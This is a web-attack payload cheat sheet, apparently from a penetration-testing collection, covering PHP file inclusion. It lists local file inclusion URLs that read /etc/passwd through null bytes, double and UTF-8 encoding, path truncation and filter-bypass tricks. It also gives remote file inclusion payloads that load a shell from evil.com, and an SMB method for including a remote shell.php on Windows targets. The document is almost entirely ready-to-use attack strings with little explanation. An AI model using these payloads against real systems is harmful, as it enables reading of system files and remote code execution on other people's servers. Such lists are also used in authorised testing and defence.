## Local File Inclusion
### Null byte
```txt
http://example.com/index.php?page=../../../etc/passwd%00
```
### Double encoding
```txt
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
```
```txt
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### UTF-8 encoding
```txt
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```
```txt
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```
### Path and dot truncation
On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.
```txt
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
```
```txt
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
```
```txt
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
```
```txt
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```
### Filter bypass tricks
```txt
http://example.com/index.php?page=....//....//etc/passwd
```
```txt
http://example.com/index.php?page=..///////..////..//////etc/passwd
```
```txt
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```
### Using Base64
[One LFI bypass to rule them all (using base64)](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)
## Remote File Inclusion
### Null byte
```txt
http://example.com/index.php?page=http://evil.com/shell.txt%00
```
### Double encoding
```txt
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```
### Bypass `allow_url_include`
When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows target using the `smb` protocol.
1. Create a share open to everyone
2. Write a PHP code inside a file: `shell.php`
3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`